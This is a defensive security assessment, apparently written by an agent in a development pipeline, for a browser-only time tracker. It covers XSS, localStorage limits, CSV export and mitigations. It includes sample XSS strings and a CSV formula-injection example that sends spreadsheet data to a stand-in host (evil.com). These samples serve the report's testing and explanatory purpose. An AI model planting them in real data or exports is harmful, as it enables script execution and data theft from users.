# Security Research — Work Time Tracker

**Role:** Security Expert
**Date:** 2026-03-18
**Scope:** Client-side work time tracker with employee management, time tracking, project/task assignment, and report generation. Static-enhanced (Vite + Tailwind), localStorage persistence, no backend.

---

## 1. Threat Assessment

### Attack Surface Summary

Since this is a client-side only application with localStorage, the attack surface is narrower than a full-stack app — but **not negligible**. The primary threats are:

| Threat Actor | Motivation | Attack Vector |
|---|---|---|
| Malicious browser extension | Data theft | Read localStorage, inject scripts |
| XSS via crafted input | Data manipulation / exfiltration | Employee names, project names, notes fields |
| Physical access attacker | View sensitive employee data | Open browser, read localStorage directly |
| Self-XSS / social engineering | Trick user into running JS | Console paste attacks, crafted import files |
| Shared computer user | Access previous user's data | localStorage persists across sessions |

### Data Sensitivity Classification

| Data Type | Sensitivity | Rationale |
|---|---|---|
| Employee names | Medium | PII — personally identifiable |
| Work hours / clock in-out | Medium | Can reveal work patterns, overtime, attendance |
| Project/task names | Low-Medium | Could reveal business-sensitive project info |
| Report exports (CSV) | Medium | Aggregated data, portable — leaves the app boundary |
| Application configuration | Low | Non-sensitive settings |

---

## 2. Vulnerability Analysis

### 2.1 Cross-Site Scripting (XSS) — HIGH PRIORITY

**Risk:** All user input fields (employee names, project names, task descriptions, notes) are rendered into the DOM. If inputs are inserted via `innerHTML` or template literals without escaping, stored XSS is trivial.

**How it happens in this architecture:**
- User enters `<img src=x onerror=alert(document.cookie)>` as an employee name
- Value is stored in localStorage
- On next render, value is injected into DOM via innerHTML
- Script executes every time the page loads (persistent/stored XSS)

**Competitor patterns observed:**
- Toggl Track: All user inputs are sanitized server-side and escaped on render
- Clockify: Uses React's built-in JSX escaping (auto-escapes by default)
- Harvest: Server-rendered with output encoding

**Mitigation:**
- Use `textContent` instead of `innerHTML` for all user-supplied data
- If dynamic HTML is needed, use a sanitization library (DOMPurify, ~7KB)
- Create a centralized `escapeHTML()` utility for any template literal rendering
- Never use `eval()`, `Function()`, or `document.write()` with user data

### 2.2 localStorage Security Limitations — MEDIUM PRIORITY

**Risk:** localStorage has no access control. Any JavaScript running on the same origin can read/write all stored data.

**Key concerns:**
- **No encryption at rest:** Data is stored in plaintext, visible via DevTools
- **No expiration:** Data persists indefinitely until explicitly cleared
- **Same-origin accessible:** Any XSS vulnerability gives full data access
- **No storage quota protection:** A malicious script could fill localStorage (5-10MB limit), causing the app to fail silently
- **Shared computers:** Previous user's data is accessible to the next user

**Competitor patterns:**
- Most client-side time trackers (e.g., Toggl's offline mode) encrypt sensitive localStorage data or use IndexedDB with encryption wrappers
- Some use sessionStorage for sensitive data (cleared on tab close)

**Mitigation:**
- Implement a "Clear All Data" button prominently in settings
- Add a session timeout / auto-lock feature for shared computers
- Consider optional data export + purge workflow
- Validate data integrity on read (detect tampering)
- Set reasonable storage limits and handle quota exceeded errors gracefully

### 2.3 CSV/Report Export Security — MEDIUM PRIORITY

**Risk:** CSV injection (also called formula injection). If exported CSV data contains cells starting with `=`, `+`, `-`, `@`, or `\t`, spreadsheet applications (Excel, Google Sheets) may interpret them as formulas.

**Example attack:**
- Employee name is set to: `=HYPERLINK("http://evil.com/steal?d="&A1,"Click here")`
- This gets exported to CSV
- When opened in Excel, the formula executes

**Competitor patterns:**
- Toggl and Harvest prefix dangerous characters with a single quote (`'`) in CSV exports
- Some tools use `.xlsx` format with explicit cell types (string, not formula)

**Mitigation:**
- Prefix cell values starting with `=`, `+`, `-`, `@`, `\t`, `\r` with a single quote or tab
- Wrap all CSV values in double quotes
- Validate/sanitize data before export, not just before display
- Document this behavior for users who re-import data

### 2.4 Data Integrity / Tampering — LOW-MEDIUM PRIORITY

**Risk:** Since localStorage is accessible via DevTools console, a user (or attacker with physical access) can modify time entries, inflate/deflate hours, alter employee records.

**Mitigation:**
- Implement a simple checksum/hash for stored data to detect tampering
- Log data modifications with timestamps (audit trail in localStorage)
- On data load, validate schema and value ranges (e.g., clock-out must be after clock-in, hours must be 0-24)

### 2.5 Dependency Supply Chain — LOW PRIORITY

**Risk:** Third-party npm packages (even Vite plugins, Tailwind) can be compromised. For a Vite + Tailwind static build, the runtime dependencies are minimal, but build-time dependencies still matter.

**Competitor patterns:**
- Standard practice: lock files (`package-lock.json`), periodic `npm audit`, pin versions

**Mitigation:**
- Use `package-lock.json` and commit it
- Run `npm audit` in CI/dev workflow
- Minimize runtime dependencies — prefer vanilla JS for CSV export, date formatting
- If adding libraries, prefer well-maintained ones with small attack surfaces (e.g., DOMPurify over full sanitization frameworks)

---

## 3. OWASP Top 10 Relevance

| OWASP Category | Applicable? | Notes |
|---|---|---|
| A01: Broken Access Control | Low | No auth/multi-user, but shared computer risk exists |
| A02: Cryptographic Failures | Low | No encryption used; data at rest is plaintext (acceptable for scope) |
| A03: Injection | **HIGH** | XSS is the primary risk — all user input flows into DOM |
| A04: Insecure Design | Medium | Need input validation, output encoding by design |
| A05: Security Misconfiguration | Low | Vite build config, CSP headers if served from a web server |
| A06: Vulnerable Components | Low | Minimal dependencies, but still track them |
| A07: Auth Failures | N/A | No authentication in scope |
| A08: Data Integrity Failures | Medium | localStorage tampering, CSV injection |
| A09: Logging & Monitoring | Low | Client-side only; add audit trail for data changes |
| A10: SSRF | N/A | No server-side requests |

---

## 4. Recommendations — Prioritized

### Critical
| # | Issue | Recommendation | Implementation Effort |
|---|---|---|---|
| 1 | XSS via user input | Use `textContent` exclusively for user data. Create `escapeHTML()` utility. Never use `innerHTML` with unsanitized data | Low — design decision, not retrofit |
| 2 | CSV formula injection | Sanitize all exported cell values — prefix dangerous characters | Low — ~20 lines in export utility |

### High
| # | Issue | Recommendation | Implementation Effort |
|---|---|---|---|
| 3 | Input validation | Validate all inputs: max length, character restrictions, type checks. Employee names ≤ 100 chars, hours 0-24, dates valid ISO format | Low-Medium |
| 4 | Data schema validation | Validate localStorage data on load — reject malformed entries, log warnings | Medium |

### Medium
| # | Issue | Recommendation | Implementation Effort |
|---|---|---|---|
| 5 | Shared computer exposure | Add "Clear All Data" button in settings. Optional: auto-clear after inactivity timeout | Low |
| 6 | Content Security Policy | If served from web server, set CSP headers: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'` | Low — server config |
| 7 | localStorage error handling | Handle `QuotaExceededError`, corrupted JSON, missing keys gracefully | Low |

### Low
| # | Issue | Recommendation | Implementation Effort |
|---|---|---|---|
| 8 | Dependency security | Commit lock file, run `npm audit`, minimize runtime deps | Ongoing |
| 9 | Audit trail | Log create/update/delete operations with timestamps in localStorage | Medium |

---

## 5. Secure Implementation Guidelines

### For the Development Team

**Input Handling Pattern:**
```
User Input → Validate (length, type, format) → Sanitize → Store → Escape on Render
```

**DOM Rendering Rules:**
1. Use `element.textContent = userValue` — NEVER `element.innerHTML = userValue`
2. If HTML templates are needed, use tagged template literals with auto-escaping or a tiny template engine that escapes by default
3. For dynamic element creation, use `document.createElement()` + `textContent`

**localStorage Wrapper Requirements:**
1. All reads must parse JSON inside try/catch
2. All writes must validate data shape before storing
3. Handle quota exceeded errors
4. Provide a `clearAll()` method for user-initiated data wipe

**CSV Export Rules:**
1. All cell values must be wrapped in double quotes
2. Double quotes within values must be escaped (`""`)
3. Values starting with `=`, `+`, `-`, `@`, `\t`, `\r` must be prefixed with a single quote
4. Use UTF-8 BOM (`\uFEFF`) for proper encoding in Excel

**Date/Time Handling:**
1. Store all timestamps in UTC ISO 8601 format
2. Validate that clock-out > clock-in
3. Validate that time entries don't overlap for the same employee
4. Reject future-dated entries beyond current day

---

## 6. Security Testing Suggestions

| Test | Type | What to Verify |
|---|---|---|
| XSS in all input fields | Manual + automated | Enter `<script>alert(1)</script>`, `<img src=x onerror=...>`, event handlers in every text field. Verify nothing executes |
| localStorage tampering | Manual | Modify localStorage via DevTools console. Verify app handles gracefully (no crashes, no XSS from stored data) |
| CSV injection | Manual | Enter `=CMD("calc")` as employee name, export CSV, open in Excel. Verify formula doesn't execute |
| Input boundary testing | Automated | Empty strings, max length strings (10K chars), special characters (`<>"'&\`), Unicode edge cases, null bytes |
| Storage quota | Manual | Fill localStorage near limit, verify app shows appropriate error |
| Data validation | Automated | Invalid dates, negative hours, overlapping time entries, missing required fields |
| Browser DevTools | Manual | Verify no sensitive data logged to console in production build |

---

## 7. Competitor Security Patterns — Research Summary

### Toggl Track
- Server-side data with client-side cache
- All inputs sanitized server-side
- API uses OAuth2 + API tokens
- CSV exports are server-generated with formula protection
- GDPR data export/deletion features

### Clockify
- React-based frontend (auto-escaping via JSX)
- REST API with JWT auth
- Rate limiting on all endpoints
- CSV/PDF exports server-generated

### Harvest
- Server-rendered pages with output encoding
- Strong CSP headers
- Subresource Integrity (SRI) on all scripts
- Comprehensive audit logging

### Key Takeaway for Our App
Since we have no backend, we lose server-side validation as a safety net. This means **client-side security discipline must be rigorous** — every input rendered to the DOM is a potential XSS vector, and there's no second layer of defense.

---

## 8. Delegation Recommendations

```
DELEGATE:
- architect: Ensure the data layer (localStorage wrapper) includes validation, sanitization, and error handling by design. CSP headers if deploying to a web server.
- senior_dev: Implement escapeHTML() utility, CSV sanitization, input validation module. These must be foundational — used everywhere, not sprinkled in ad-hoc.
```

---

**Summary:** The biggest security risk for this application is **XSS through user input rendered to the DOM**. Since there's no backend safety net, client-side output encoding must be treated as a hard requirement, not a nice-to-have. CSV injection is the second priority. Everything else is lower risk given the client-only, single-user architecture. Security here is cheap if built in from the start — expensive to retrofit.

---
Status: PHASE_COMPLETE: research
